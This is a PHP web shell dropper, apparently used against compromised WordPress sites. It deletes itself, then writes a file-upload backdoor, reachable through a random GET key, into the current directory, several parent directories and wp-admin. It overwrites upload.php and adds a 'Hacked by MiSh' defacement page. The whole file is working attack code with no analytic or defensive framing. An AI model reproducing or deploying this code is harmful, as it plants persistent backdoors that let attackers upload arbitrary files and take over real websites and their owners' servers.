<?php
@define('SELF_PATH', __FILE__);
unlink(__FILE__);
error_reporting(0);
function RandomString($length = 7) {
    $characters = 'abcdefghijklmnopqrstuvwxyz';
    $randomS = '';
    for ($i = 0; $i < $length; $i++) {
        $randomS .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomS;
}
$ndom = RandomString();
$fileh = "MiSh";
$filev = "../upload.php";
$file = '<?php if(isset($_GET["'.$ndom.'"])){echo"<font color=#FFFFFF>[uname]".php_uname()."[/uname]";echo"<br><font color=#FFFFFF>[dir]".getcwd()."[/dir]";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}}}?>'."\r\n";
$file .= "<title>Hacked by MiSh</title><body bgcolor=black><table width=100% height=100%><td align=center><span style='font: 40px tahoma;size:40px;color:white;text-shadow: 0px 0px 50px;'><strong>Hacked by MiSh";
$r=fopen("jr.php", "w");fwrite($r,$file);fclose($r);
$r=fopen("../jr.php", "w");fwrite($r,$file);fclose($r);
$r=fopen("../../jr.php", "w");fwrite($r,$file);fclose($r);
$r=fopen("../../../jr.php", "w");fwrite($r,$file);fclose($r);
$r=fopen("../../../../jr.php", "w");fwrite($r,$file);fclose($r);
$r=fopen("../../../../../jr.php", "w");fwrite($r,$file);fclose($r);
$r=fopen("../../../../../jr.php", "w");fwrite($r,$file);fclose($r);
$r=fopen("../../wp-admin/jr.php", "w");fwrite($r,$file);fclose($r);
$r=fopen($filev, "w");fwrite($r,$file);fclose($r);
echo "Randomnya:".$ndom;
